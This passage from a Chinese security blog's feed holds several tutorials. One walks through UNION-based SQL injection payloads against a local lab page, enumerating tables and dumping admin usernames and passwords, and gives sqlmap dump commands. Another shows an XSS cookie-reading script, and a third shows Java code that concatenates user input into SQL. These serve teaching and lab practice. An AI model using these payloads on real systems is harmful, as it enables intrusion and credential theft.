+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="n">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">localhost&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">sqls&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="k">index&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">php&lt;/span>&lt;span class="o">?&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">union&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">null&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="k">table_name&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="k">null&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">information_schema&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">tables&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">where&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">table_schema&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;test&amp;#39;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
+&lt;li>查字段&lt;/li>
+&lt;/ul>
+&lt;p>在MySQL中，字段名存放在information_schema数据库下columns表column_name字段中,这里使用的是columns表。&lt;/p>
+&lt;p>方法一:&lt;/p>
+&lt;pre tabindex="0">&lt;code>http://localhost/sqls/index.php?id=2 and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&amp;#39;test&amp;#39; and table_name=&amp;#39;sqltest&amp;#39;
+&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://cdn.kayleh.top/gh/kayleh/cdn4/SQL%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/055b34fa808266a8e9af8b9cea0865db.jpg"
+loading="lazy"
+alt="img"
+>&lt;/p>
+&lt;p>也可以查看admin表中的字段。&lt;/p>
+&lt;p>方法二:&lt;/p>
+&lt;pre tabindex="0">&lt;code>http://localhost/sqls/index.php?id=2 union select null,column_name,null from information_schema.columns where table_schema=&amp;#39;test&amp;#39; and table_name=&amp;#39;admin&amp;#39;
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>
+&lt;p>查数据&lt;/p>
+&lt;p>最终想得到的就是字段里的内容了、前面的数据库名、表名都获得了、获取值就很简单了。&lt;/p>
+&lt;p>方法一:&lt;/p>
+&lt;p>查询sqltest表:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="n">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">localhost&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">sqls&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="k">index&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">php&lt;/span>&lt;span class="o">?&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">union&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">group_concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">title&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">content&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">`&lt;/span>&lt;span class="n">sqltest&lt;/span>&lt;span class="o">`&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>查询admin表:&lt;/p>
+&lt;pre tabindex="0">&lt;code>http://localhost/sqls/index.php?id=2 and 1=2 union select 1,group_concat(id,user,pwd),3 from admin
+&lt;/code>&lt;/pre>&lt;p>方法二:&lt;/p>
+&lt;p>查询sqltest表:&lt;/p>
+&lt;pre tabindex="0">&lt;code>http://localhost/sqls/index.php?id=2 union select null,title,content from sqltest
+&lt;/code>&lt;/pre>&lt;p>查询admin表:&lt;/p>
+&lt;pre tabindex="0">&lt;code>http://localhost/sqls/index.php?id=2 union select id,user,pwd from admin
+&lt;/code>&lt;/pre>&lt;p>方法三:&lt;/p>
+&lt;p>查询admin表:&lt;/p>
+&lt;pre tabindex="0">&lt;code>http://localhost/sqls/index.php?id=2 and 1=2 union select 1,2,concat(user,0x3c,pwd) from admin
+&lt;/code>&lt;/pre>&lt;/li>
+&lt;/ul>
+&lt;h4 id="sqlmap">sqlmap&lt;/h4>
+&lt;blockquote>
+&lt;p>工具：sqlmap&lt;/p>
+&lt;p>靶场：https://rimovni.exeye.run/hugkudure/well&lt;/p>
+&lt;!-- raw HTML omitted -->
+&lt;/blockquote>
+&lt;p>sqlmap注入常见用法：&lt;/p>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>检查注入点&lt;/th>
+&lt;th>sqlmap -u &amp;ldquo;&lt;a class="link" href="http://ooxx.com/a.php?id=1%22" target="_blank" rel="noopener"
+>http://ooxx.com/a.php?id=1"&lt;/a>&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>列数据库信息&lt;/td>
+&lt;td>sqlmap -u &amp;ldquo;&lt;a class="link" href="http://ooxx.com/a.php?id=1%22" target="_blank" rel="noopener"
+>http://ooxx.com/a.php?id=1"&lt;/a> &amp;ndash;dbs&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>指定数据库名列出所有表&lt;/td>
+&lt;td>sqlmap -u &amp;ldquo;&lt;a class="link" href="http://ooxx.com/a.php?id=1%22" target="_blank" rel="noopener"
+>http://ooxx.com/a.php?id=1"&lt;/a> -D dbsname &amp;ndash;tables&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>指定数据库名表名列出所有字段&lt;/td>
+&lt;td>sqlmap -u &amp;ldquo;&lt;a class="link" href="http://ooxx.com/a.php?id=1%22" target="_blank" rel="noopener"
+>http://ooxx.com/a.php?id=1"&lt;/a> -D dbsname -T tablename &amp;ndash;columns&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>定数据库名表名字段dump出指定字段&lt;/td>
+&lt;td>sqlmap -u &amp;ldquo;&lt;a class="link" href="http://ooxx.com/a.php?id=1%22" target="_blank" rel="noopener"
+>http://ooxx.com/a.php?id=1"&lt;/a> -D dbsname -T tablename -C columnname &amp;ndash;dump&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>cookie 注入&lt;/td>
+&lt;td>&amp;ndash;cookie=COOKIE 在需要登录的地方，需要登录后的cookie&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>执行指定的 SQL 语句&lt;/td>
+&lt;td>&amp;ndash;sql-query=QUERY&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>代理注入&lt;/td>
+&lt;td>&amp;ndash;proxy=&amp;ldquo;http://127.0.0.1:8087&amp;rdquo;&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;h4 id="命令">命令&lt;/h4>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-cmd" data-lang="cmd">&lt;span class="line">&lt;span class="cl">python sqlmap.py -u &lt;span class="s2">&amp;#34;https://rimovni.exeye.run/hugkudure/well&amp;#34;&lt;/span> --form --batch -D twosecu1_vuln_06 -T flag -C flag --dump
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;blockquote>
+&lt;p>&amp;ndash;form :表单&lt;/p>
+&lt;p>&amp;ndash;batch :跳过选择&lt;/p>
+&lt;/blockquote>
+&lt;p>开始注入，获得数据库&lt;/p>
+&lt;p>&lt;img src="https://cdn.kayleh.top/gh/kayleh/cdn4/SQL%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/1617674097343.png"
+loading="lazy"
+alt="1617674097343"
+>&lt;/p></description></item><item><title>Front end security</title><link>https://Kayleh.com/post/front-end-security/</link><pubDate>Sun, 04 Apr 2021 23:56:49 +0800</pubDate><guid>https://Kayleh.com/post/front-end-security/</guid><description>&lt;blockquote>
+&lt;p>前端安全&lt;/p>
+&lt;/blockquote>
+&lt;h1 id="xss">xss&lt;/h1>
+&lt;p>跨站脚本攻击，是WEB程序中一种常见的漏洞。其主要的攻击手段是在在利用网站上的可由用户输入信息的地方，恶意注入含有攻击性的脚本，达到攻击网站或者窃取用户cookied等隐私信息的目的。&lt;/p>
+&lt;blockquote>
+&lt;p>XSS漏洞测设流程：
+第一步：在目标站点上找到输入点，比如查询接口，留言板等；
+第二步：输入一组“特殊字符+唯一识别字符”，点击提交，查看返回的源码，是否有做对应的处理；
+第三步：通过搜索定位到唯一字符，结合唯一字符前后语法确认是否可以构成执行js的条件（构造闭合）
+第四步：提交构造的脚本代码（以及各种绕过姿势），看是否可以成功执行，如果成功执则说明存在XSS漏洞&lt;/p>
+&lt;/blockquote>
+&lt;h1 id="html5存储">Html5存储&lt;/h1>
+&lt;p>&lt;img src="https://static.cdnjs.cloud/20200628/%e6%89%b9%e6%b3%a8%202020-06-28%20113456_2412.png"
+loading="lazy"
+>&lt;/p></description></item><item><title>XSS跨站脚本攻击</title><link>https://Kayleh.com/post/xss-crosssite-scripting-attack/</link><pubDate>Sun, 31 May 2020 20:58:53 +0800</pubDate><guid>https://Kayleh.com/post/xss-crosssite-scripting-attack/</guid><description>&lt;h3 id="xss跨站脚本攻击">XSS跨站脚本攻击&lt;/h3>
+&lt;p>在做社区项目的时候，发现了一个XSS漏洞。&lt;/p>
+&lt;p>&lt;img src="https://cdn.kayleh.top/gh/kayleh/cdn/img/XSS%e8%b7%a8%e7%ab%99%e8%84%9a%e6%9c%ac%e6%94%bb%e5%87%bb/xss.png"
+loading="lazy"
+alt="img"
+>&lt;/p>
+&lt;h5 id="什么是xss跨站脚本攻击">什么是XSS跨站脚本攻击？&lt;/h5>
+&lt;blockquote>
+&lt;p>XSS攻击全称跨站脚本攻击，是一种在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。&lt;/p>
+&lt;/blockquote>
+&lt;p>在点击回复二级评论时，JavaScript脚本会注入页面:&lt;/p>
+&lt;p>示例：&lt;/p>
+&lt;p>&lt;img src="https://cdn.kayleh.top/gh/kayleh/cdn/img/XSS%e8%b7%a8%e7%ab%99%e8%84%9a%e6%9c%ac%e6%94%bb%e5%87%bb/2.png"
+loading="lazy"
+alt="img"
+>&lt;/p>
+&lt;p>&lt;img src="https://cdn.kayleh.top/gh/kayleh/cdn/img/XSS%e8%b7%a8%e7%ab%99%e8%84%9a%e6%9c%ac%e6%94%bb%e5%87%bb/3.png"
+loading="lazy"
+alt="img"
+>&lt;/p>
+&lt;p>然后客户端就调用脚本alert导致无限弹窗。&lt;/p>
+&lt;p>还可以使用&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nx">script&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="nx">alert&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">cookie&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="err">/script&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>获取页面cookie，比如登录的token。&lt;/p>
+&lt;p>解决办法：&lt;/p>
+&lt;blockquote>
+&lt;p>Jsoup使用标签白名单的机制用来进行防止XSS攻击&lt;/p>
+&lt;/blockquote>
+&lt;p>参考：&lt;/p>
+&lt;p>&lt;a class="link" href="https://www.zykcoderman.xyz/web/post/detail/401" title="XSS"
+target="_blank" rel="noopener"
+>[XSS跨站脚本攻击]&lt;/a>&lt;/p></description></item><item><title>SQL注入式攻击</title><link>https://Kayleh.com/post/sql-injection-attacks/</link><pubDate>Sat, 30 May 2020 21:13:52 +0800</pubDate><guid>https://Kayleh.com/post/sql-injection-attacks/</guid><description>&lt;h3 id="sql注入式攻击">SQL注入式攻击&lt;/h3>
+&lt;p>攻击者把SQL命令插入到Web表单的输入域或页面请求的查询字符串，欺骗服务器执行恶意的SQL命令。在某些表单中，用户输入的内容直接用来构造（或者影响）动态SQL命令，或作为存储过程的输入参数，这类表单特别容易受到SQL注入式攻击。&lt;/p>
+&lt;h4 id="常见的sql注入式攻击主要是利用statement的缺陷">常见的SQL注入式攻击主要是利用Statement的缺陷，&lt;/h4>
+&lt;p>服务端验证：&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="nd">@Override&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">public&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nf">login&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Account&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">account&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kd">throws&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">SQLException&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">String&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sql&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s">&amp;#34;insert into account values(null,&amp;#34;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">account&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">userName&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s">&amp;#34;,&amp;#34;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">account&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">password&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s">&amp;#34;)&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">try&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Connection&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">conn&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DriverManager&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">getConnection&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;jdbc:mysql://127.0.0.1:3306/account?characterEncoding=UTF-8&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="s">&amp;#34;root&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s">&amp;#34;password&amp;#34;&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">try&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Statement&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">stmt&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">conn&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">createStatement&lt;/span>&lt;span class="p">())&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">try&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ResultSet&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">rs&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">stmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">executeQuery&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;SELECT id, grade, name, gender FROM students WHERE gender=1&amp;#34;&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">while&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">rs&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">next&lt;/span>&lt;span class="p">())&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kt">int&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">rs&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">getInt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">1&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">String&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">username&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">rs&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">getString&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">2&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">String&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">password&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">rs&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">getString&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">3&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>客户端&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">link&lt;/span> &lt;span class="na">rel&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;stylesheet&amp;#34;&lt;/span> &lt;span class="na">href&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;https://cdn.kayleh.top/npm/bootstrap@3.3.7/dist/css/bootstrap.min.css&amp;#34;&lt;/span> &lt;span class="na">integrity&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u&amp;#34;&lt;/span> &lt;span class="na">crossorigin&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;anonymous&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">link&lt;/span> &lt;span class="na">rel&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;stylesheet&amp;#34;&lt;/span> &lt;span class="na">href&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;https://cdn.kayleh.top/npm/bootstrap@3.3.7/dist/css/bootstrap-theme.min.css&amp;#34;&lt;/span> &lt;span class="na">integrity&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp&amp;#34;&lt;/span> &lt;span class="na">crossorigin&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;anonymous&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">script&lt;/span> &lt;span class="na">src&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;https://cdn.kayleh.top/npm/bootstrap@3.3.7/dist/js/bootstrap.min.js&amp;#34;&lt;/span> &lt;span class="na">integrity&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa&amp;#34;&lt;/span> &lt;span class="na">crossorigin&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;anonymous&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;/&lt;/span>&lt;span class="nt">script&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">div&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;col-xs-8 col-sm-8 col-md-8 jumbotron&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">form&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">div&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;form-group&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">label&lt;/span> &lt;span class="na">for&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;exampleInputEmail1&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>Username&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">label&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">input&lt;/span> &lt;span class="na">type&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;email&amp;#34;&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;form-control&amp;#34;&lt;/span> &lt;span class="na">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;exampleInputEmail1&amp;#34;&lt;/span> &lt;span class="na">placeholder&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;Email&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">div&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;form-group&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">label&lt;/span> &lt;span class="na">for&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;exampleInputPassword1&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>Password&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">label&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">input&lt;/span> &lt;span class="na">type&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;password&amp;#34;&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;form-control&amp;#34;&lt;/span> &lt;span class="na">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;exampleInputPassword1&amp;#34;&lt;/span> &lt;span class="na">placeholder&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;Password&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">div&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;form-group&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">label&lt;/span> &lt;span class="na">for&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;exampleInputFile&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>File input&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">label&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">input&lt;/span> &lt;span class="na">type&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;file&amp;#34;&lt;/span> &lt;span class="na">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;exampleInputFile&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
